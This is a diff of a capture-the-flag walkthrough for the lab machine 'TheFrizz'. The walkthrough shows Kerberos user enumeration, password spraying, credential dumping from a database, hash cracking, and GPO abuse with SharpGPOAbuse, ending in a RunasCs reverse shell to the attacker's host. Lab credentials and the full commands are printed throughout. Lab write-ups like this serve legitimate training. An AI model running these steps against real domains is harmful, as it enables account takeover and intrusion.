@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-```bash
+```
 nmap -sV -sC -vv 10.10.1
 nmap -sU --top-ports=10 -vv 10.10.1
 
@@ -61,18 +61,18 @@ PORT     STATE         SERVICE      REASON
 ----
 ## SMB Enumeration
 - t
-```bash
+```
 
 ```
 - crackmapexec/netexec
-```bash
+```
 
 ```
 ---
 ## Directory Enumeration
 - Gobuster (tried a few but this gave some hits):
 	- Directory
-```bash
+```
 gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -x php dns -k --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
@@ -110,7 +110,7 @@ gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -x php dns -k --wordlist /us
 ```
 ## Kerbrute
 - I get a hit on :
-```bash
+```
 ./kerbrute_linux_amd64 userenum --dc 10.10.11.60 -d frizz.htb /home/kali/Downloads/Windows/ActiveDirectory/TheFrizz/users
 
     __             __               __     
@@ -128,7 +128,7 @@ Version: dev (9cfb81e) - 04/23/25 - Ronnie Flathers @ropnop
 2025/04/23 15:00:15 >  Done! Tested 9 usernames (1 valid) in 0.055 seconds
 ```
 	- users file:
-```bash
+```
 cat users
 ralphie
 wanda
@@ -150,12 +150,12 @@ ms.frizzle
 	- wanda
 	- fiona
 - some text under hacking :
-```bash
+```
 V2FudCB0byBsZWFybiBoYWNraW5n IGJ1dCBkb24ndCB3YW50IHRvIGdv IHRvIGphaWw/IFlvdSdsbCBsZWFy biB0aGUgaW4ncyBhbmQgb3V0cyBv ZiBTeXNjYWxscyBhbmQgWFNTIGZy b20gdGhlIHNhZmV0eSBvZiBpbnRl cm5hdGlvbmFsIHdhdGVycyBhbmQg aXJvbiBjbGFkIGNvbnRyYWN0cyBm cm9tIHlvdXIgY3VzdG9tZXJzLCBy ZXZpZXdlZCBieSBXYWxrZXJ2aWxs ZSdzIGZpbmVzdCBhdHRvcm5leXMu
 ```
 	- cleaned it using `:%s/ /\\r/g` to replace space with new line
 	- decoding:
-```bash
+```
 cat crack| base64 -d
 
 ---OUTPUT---
@@ -164,14 +164,14 @@ Want to learn hacking but don't want to go to jail? You'll learn the in's and ou
 
 
 - in reverse shell found config.php with some db creds:
-```bash
+```
 $databaseServer = 'localhost';
 $databaseUsername = 'MrGibbonsDB';
 $databasePassword = 'MisterGibbs!Parrot!?1';
 $databaseName = 'gibbon';
 ```
 - After a lot of playing around I found mysql.exe in /xampp/mysql/bin and passed the following commands to eventually grab the password and salt:
-```bash
+```
 C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -D gibbon --column-names -e "SELECT * FROM gibbonperson;" > C:\xampp\htdocs\gibbonperson.txt
 --
 C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -D gibbon -e "SELECT username, passwordStrong, passwordStrongSalt FROM gibbonperson;" > C:\xampp\htdocs\gibbon_credentials.txt
@@ -183,14 +183,14 @@ username        passwordStrong  passwordStrongSalt
 f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
 ```
 - Then I saved this as a hash file in the format
-```bash
+```
 cat hash1
 
 ---OUTPUT---
 $dynamic_65$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
 ```
 - And then tried to crack it with john:
-```bash
+```
 john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt hash1
 
 ---OUTPUT---
@@ -199,7 +199,7 @@ Jenni_Luvs_Magic23 (?)
 - Tried to logon with winrm and first got some KDC error..
 	- found that winrm was removed from the changelog
 - Using kerbrute I tried to check if user credentials work and it did (did `sudo ntpdate 10.10.11.60` first for clock skew):
-```bash
+```
 ./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb /home/kali/Downloads/Windows/ActiveDirectory/TheFrizz/user 'Jenni_Luvs_Magic23'
 
 ---OUTPUT---
@@ -219,7 +219,7 @@ Version: dev (9cfb81e) - 04/24/25 - Ronnie Flathers @ropnop
 2025/04/24 02:32:11 >  Done! Tested 1 logins (1 successes) in 5.059 seconds
 ```
 - Grabbed a TGT
-```bash
+```
 impacket-getTGT -dc-ip 10.10.11.60 'frizz.htb/f.frizzle:Jenni_Luvs_Magic23'
 
 ---OUTPUT---
@@ -228,18 +228,18 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in f.frizzle.ccache
 ```
 - exported it to KRB5CCNAME
-```bash
+```
 export KRB5CCNAME=f.frizzle.ccache
 ```
 - Tried to ssh with ticket
-```bash
+```
 ssh -K f.frizzle@10.10.11.60
 ```
 	- Initially failed (just like winrm)
 		- winrm did give an extra info in error talking about unable to find realm "FRIZZ.HTB"
 - **Fix** 
 	- I had to create a krb5.conf file to fix it
-```bash
+```
 cat /etc/krb5.conf
 
 ---OUTPUT---
@@ -261,7 +261,7 @@ cat /etc/krb5.conf
 	- ssh worked after this and I could grab user flag
 ## Privilege Escalation
 - ON enumeration I found a hidden folder in C:\ drive
-```bash
+```
 cd C:\
 Get-ChildItem -Force
 --OR--
@@ -304,15 +304,15 @@ d----          10/29/2024  7:28 AM                xampp
 ```
 	- We find zip files inside.
 - We grab the files using sftp:
-```bash
+```
 sftp -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes f.frizzle@frizz.htb
 ```
 - Unzip with 7z:
-```bash
+```
 7z x \$RE2XMEG.7z
 ```
 - We check out the folder (we find config directory):
-```bash
+```
 cd wapt/conf
 cat waptserver.ini
 
@@ -320,14 +320,14 @@ cat waptserver.ini
 wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
 ```
 - We decode it :
-```bash
+```
 echo -n "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d
 
 ---OUTPUT---
 !suBcig@MehTed!R
 ```
 - We pass net users to get a list of all users:
-```bash
+```
 net users
 
 ---OUTPUT---
@@ -344,7 +344,7 @@ v.frizzle                w.li                     w.Webservice
 The command completed with one or more errors.
 ```
 - Copy users to a file and password spray with kerbrute with our new password:
-```bash
+```
 ./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb /home/kali/Downloads/Windows/ActiveDirectory/TheFrizz/user '!suBcig@MehTed!R'
 
     __             __               __     
@@ -363,7 +363,7 @@ Version: dev (9cfb81e) - 04/24/25 - Ronnie Flathers @ropnop
 ```
 	- User M.SchoolBus has these credentials.
 - We also grab some data for bloodhound analysis ( can also do this with f.frizzle)
-```bash
+```
 bloodhound-python -dc frizzdc.frizz.htb -ns 10.10.11.60 -d frizz.htb -u 'M.SchoolBus' -p '!suBcig@MehTed!R' -c all
 
 ---OUTPUT---
@@ -389,13 +389,13 @@ INFO: Done in 00M 04S
 	- Signs of GPOAbuse possibility (Bloodhound shows e own a lot of users/ writegplink/writegpo etc)
 		- whoami /all will show:
 - We login via ssh the same way as f.frizzle.
-```bash
+```
 impacket-getTGT -dc-ip 10.10.11.60 'frizz.htb/M.SchoolBus:!suBcig@MehTed!R'
 export KRB5CCNAME=M.SchoolBus.ccache
 ssh -K M.SchoolBus@10.10.11.60
 ```
 	- We check whoami /all
-```bash
+```
 whoami /all
 
 USER INFORMATION
@@ -444,7 +444,7 @@ User claims unknown.
 
 ```
 		- If we do net user we only see Desktop Admins group (which could also be a good tell of possible GPO)
-```bash
+```
 net user M.SchoolBus         
 
 ---OUTPUT---
@@ -485,7 +485,7 @@ The command completed successfully.
 		- Auto abuse GPO executable
 - Final commands (GPO Abuse from M.SchoolBus):
 	- Create new GPO and check i it exists
-```bash
+```
 # Create New GPO (might take a little time)
 New-GPO -Name thishurts | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
 
@@ -511,16 +511,16 @@ thishurts                         dbfddbdc-d11b-4011-b69f-9e83bf01ea66
 ```
 - Then we use our executable as an exploit. (we can upload it with curl)
 	- start python server on directory where our executables are:
-```bash
+```
 python3 -m http.server 8001
 ```
 	- Grab the files from our target (make sure you are in a directory where you can upload the files):
-```bash
+```
 curl "http://10.10.14.25:8001/SharpGPOAbuse.exe" -o "SharpGPOAbuse.exe"
 curl "http://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
 ```
 - Now we can pass our exploit and force the group policy to be updated so we can relogin  with new updated policy:
-```bash
+```
 # Exploit
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName thishurts
 
@@ -546,7 +546,7 @@ User Policy update has completed successfully.
 ```
 	- Can also use another user here like f.frizzle (I tried to but user didn't get added to Adminsitrator local group)...however I did see f.frizzle in the localgroup when checking..the box is still active so someone did manage to do that somehow.
 - Then we can check if it worked by checking the administrator group members (couldn't get f.frizzle to appear here...but did see user here maybe by another user doing this box):
-```bash
+```
 # Check if it worked
 PS C:\Users\M.SchoolBus\Documents> net localgroup Administrators                                                                        
 Alias name     Administrators
@@ -560,7 +560,7 @@ M.SchoolBus
 The command completed successfully.
 ```
 	- Also after this command, if you do `whoami /all` on the account we added to adminsitrators group, there will be a change under the User claim's information saying Kerberos auth won't work anymore pointing that we can't use our ticket to login again now.
-```bash
+```
 USER CLAIMS INFORMATION
 -----------------------
 
@@ -570,7 +570,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 - Since we won't be able to login with our tickets, we use RunasCs' to login again as it's meant for such purposes.
-```bash
+```
 .\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.14.3:9998
 ```
 	- with netcat listening on the port to get a reverse shell
